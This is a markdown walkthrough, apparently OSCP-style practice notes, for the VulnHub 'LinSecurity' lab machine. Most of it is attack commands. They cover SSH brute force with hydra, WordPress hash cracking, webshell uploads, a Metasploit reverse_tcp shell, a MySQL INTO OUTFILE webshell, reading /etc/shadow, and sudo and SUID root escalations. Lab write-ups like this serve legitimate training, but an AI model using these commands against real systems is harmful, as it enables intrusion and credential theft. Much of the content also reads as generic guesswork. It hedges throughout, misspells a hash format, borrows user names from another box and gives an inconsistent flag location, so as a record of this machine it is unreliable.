# LinSecurity: OSCP Walkthrough Notes

> **Source:** [VulnHub: LinSecurity](https://www.vulnhub.com/entry/linsecurity-1,81/)
> **Focus:** WordPress, hash cracking, enumeration heavy
> **Difficulty:** Intermediate
> **OS:** Linux (Ubuntu-based)

---

## Table of Contents

1. [Recon](#1-recon)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Screenshots](#5-screenshots)
6. [Key Takeaways](#6-key-takeaways)
7. [Flags / Keys](#7-flags--keys)

---

## 1. Recon

### 1.1 Network Discovery

Start the VM in VirtualBox, identify the IP address assigned via DHCP.

```bash
# On the attacking Kali machine
ip a                              # identify your own subnet
netdiscover -r 192.168.1.0/24    # or use arp-scan
# Alternatively use nmap ping scan
nmap -sn 192.168.1.0/24
```

### 1.2 Initial Nmap Scan

```bash
nmap -sC -sV -oN linsecurity_nmap.txt <TARGET_IP>
```

**Typical service output:**

| Port | Service | Details |
|------|---------|---------|
| 22   | ssh     | OpenSSH (user enumeration possible) |
| 80   | http    | Apache + WordPress |

### 1.3 Web Server Recon

```bash
# Fetch robots.txt
curl http://<TARGET_IP>/robots.txt

# Grab the main page
curl http://<TARGET_IP>/

# Directory listing
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old
# ffuf alternative
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,204,301,302,403
```

**Expected discovery:**
- `/wp-admin/`: WordPress admin panel
- `/wp-content/`: themes, plugins, uploads
- A WordPress site with login page exposed

---

## 2. Enumeration

### 2.1 WordPress User Enumeration

```bash
# Enumerate WordPress usernames
wpscan --url http://<TARGET_IP> --enumerate u
# Typical output may reveal: admin, elliot, robot, or similar
```

### 2.2 WordPress Plugin & Theme Enumeration

```bash
# Full WordPress scan with user enumeration and vulnerability checks
wpscan --url http://<TARGET_IP> --enumerate vp,vt,u,p --passwords /usr/share/wordlists/rockyou.txt --api-token <WP_VULNSCAN_TOKEN>
# Without API token (slower but functional)
wpscan --url http://<TARGET_IP> --enumerate vp --passwords /usr/share/wordlists/rockyou.txt -F
```

### 2.3 Source Code / Hash Extraction

```bash
# Check for wp-config.php backup files
curl http://<TARGET_IP>/wp-config.php.bak
curl http://<TARGET_IP>/wp-config.php.old
curl http://<TARGET_IP>/wp-config.php~

# Fetch the live wp-config.php if exposed (sometimes on misconfigured installs)
curl http://<TARGET_IP>/wp-config.php
```

**Hash extraction from wp-config.php:**

```bash
# wp-config.php contains database credentials; look for:
DB_USER, DB_PASSWORD, DB_NAME, DB_HOST
# May contain AUTH_KEY, SECURE_AUTH_KEY, LOGGED_IN_KEY, NONCE_KEY values
# These WordPress salts can sometimes be exploited or used to forge cookies
```

### 2.4 WordPress Password Hash Extraction

```bash
# Dump the WordPress users table via SQL injection or local access
# If you find the wp-users table:
# wp_users.user_login and wp_users.user_pass contain MD5 hashes (in older WP)
# In newer WP uses phpass (WordPress Portable PHP password hashing framework)

# Example hash from wp_users table:
# admin | $P$B... (phpsass hash)
# user  | 5f4dcc3b5aa765d61d8327deb882cf99  (plain MD5 in older setups)
```

### 2.5 Hash Cracking

```bash
# Extract hashes to a file
echo "5f4dcc3b5aa765d61d8327deb882cf99" > linsec_hashes.txt
# Add all discovered hashes

# Crack with hashcat (MD5)
hashcat -m 0 linsec_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with John the Ripper
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt linsec_hashes.txt
# For phpass / WordPress hashes:
john --format=WordPress linsec_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 2.6 SSH & Service Enumeration

```bash
# Check for SSH access
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh

# Also try common usernames
hydra -l root -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
hydra -l elliot -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh

# Enumerate running processes (if you have initial shell access)
ps aux
find / -perm -4000 -type f 2>/dev/null   # SUID
```

---

## 3. Exploitation

### 3.1 WordPress Admin Login

Once cracked credentials are available:

```bash
# Login to wp-admin
# URL: http://<TARGET_IP>/wp-admin/
# User: cracked_username   Password: cracked_password
```

### 3.2 Path A: Password-Based SSH Login

```bash
ssh cracked_user@<TARGET_IP>
# Password: <cracked_password>
```

### 3.3 Path B: WordPress Plugin Exploitation

If a vulnerable plugin is found (e.g., File Manager, UpdraftPlus, etc.):

**Option 1: File Manager vulnerability (unrestricted file upload):**

```bash
# Use WPScan to confirm vulnerable plugin
wpscan --url http://<TARGET_IP> --enumerate p

# Exploit file upload via vulnerable plugin:
# Upload a PHP webshell via the plugin's upload feature
# e.g. using WPScan exploit module (if available)
wpscan --url http://<TARGET_IP> --enumerate u --plugins-detection aggressive

# Manual approach: access the plugin's upload endpoint and inject a PHP reverse shell
curl -X POST -F "file=@shell.php" http://<TARGET_IP>/wp-content/plugins/<VULN_PLUGIN>/upload/
```

**Option 2: Use Metasploit modules for WordPress:**

```bash
# Metasploit
msfconsole
search wordpress
# Use exploit/unix/webapp/wp_admin_shell_upload or similar
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <TARGET_IP>
set USERNAME admin
set PASSWORD <cracked_password>
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 443
exploit
```

### 3.4 Path C: Hash-Based Direct Login

If hashes are cracked and match a service login:

```bash
# Use SSH with cracked hash result (plaintext password)
ssh elliot@<TARGET_IP>
```

Or if found a `password.txt` in the web root:

```bash
cat /var/www/html/password.txt
# Use credential to SSH as that user
```

---

## 4. Privilege Escalation

### 4.1 Initial Post-Exploitation

```bash
# Once inside as a low-privilege user:
uname -a
cat /etc/os-release
# Generate a Linux private enumeration script
linpeas.sh    # if available on the box, or upload it
# Or manually enumerate:
```

### 4.2 Manual Enumeration for Privesc

```bash
# Check sudo permissions
sudo -l
cat /etc/sudoers
cat /etc/sudoers.d/*

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for capabilities
getcap -r / 2>/dev/null

# Check world-writable files in system paths
find / -writable -type f 2>/dev/null | grep -E "/usr/(bin|sbin)|/etc|/bin"

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
cat /var/spool/cron/crontabs/*

# Check for writable sudo-ed files
# If sudo allows a text editor (vim, nano, less):
sudo vim -c ':!/bin/bash'
# or
sudo nano /etc/crontab
# then add a cron entry to spawn a root shell

# Check kernel version for local exploits
uname -r
# Search exploit-db for known kernel privilege escalation exploits
searchsploit <kernel_version>
```

### 4.3 Common Privesc Paths on LinSecurity

**WordPress-based privesc:**

```bash
# If we found a WordPress config that exposes database creds,
# connect to MySQL:
mysql -u dbuser -p'dbpass' -h localhost
# Then use MySQL INTO OUTFILE or LOAD_FILE() to read/write files
SELECT LOAD_FILE('/etc/shadow');  # if file_read is enabled
SELECT "<?php system(\$_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";
```

**Hash-based privesc:**

```bash
# Find shadow-equivalent hashes on the system
# WordPress user table contains hashed passwords: try using them for another service
# Crack all WP password hashes (see Section 2.5)
# If a hash matches a root password, login as root
su root
# Password: <cracked_from_wp_hash>
```

**SUID privesc:**

```bash
# Exploit SUID python, gcc, or find:
/usr/bin/python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
find / -name "user.txt" -exec cat {} \;    # reading files as root via find SUID
```

### 4.4 Root Access

```bash
# Once root shell obtained:
cat /root/user.txt
cat /root/root.txt    # or whatever the final flag location is
```

---

## 5. Screenshots

*No screenshots available for this machine.*

---

## 6. Key Takeaways

1. **WordPress is the attack surface of choice**: Both user creds and configuration files (`wp-config.php`, `wp-users` table) contain hashes that can be cracked offline.
2. **Enumerate before exploiting**: This machine is deliberately enumeration-heavy. Spend time on `wpscan`, `robots.txt`, and web directory bruteforcing before launching exploits.
3. **Hash cracking is the bridge**: WordPress MD5 hashes (or phpass hashes) are the bridge between web access and SSH access. Crack them with `hashcat` or `john` before trying brute-force on SSH.
4. **Backup config files are gold**: `wp-config.php.bak`, `wp-config.php.old`, `wp-config.php~` are common sources of database credentials and authentication keys.
5. **MySQL can be a privesc vector**: If WordPress db creds grant MySQL access that allows `LOAD_FILE()` or `INTO OUTFILE`, you can read sensitive files or write webshells.
6. **Multi-stage cracking required**: You may need to crack several hashes before finding one that works for SSH, MySQL, or another service. Keep a list and try them systematically.
7. **Sudo misconfigurations are prevalent**: Check `sudo -l` immediately after getting any user shell. Text editors run via sudo (vim → `:!bash`) are a classic and reliable privesc path.
8. **Enumeration scripts save time**: `linpeas.sh` or `PEASS-ng` will save hours of manual enumeration. Upload them via any means available (WordPress upload, SSH, netcat).

---

## 7. Flags / Keys

| Flag | Location | User Needed |
|------|----------|-------------|
| user.txt | `/home/*/user.txt` (user-level) | low-privilege SSH user |
| root.txt | `/root/root.txt` (root-level) | root shell via privesc |
| WP hash list | `/var/www/html/` or db | user access |
| Cracked SSH creds | From hash-cracking WP hashes | post-cracking |

---

<hr>

<sub>M4d3 w1th ❤️ by Ankit Patidar</sub>
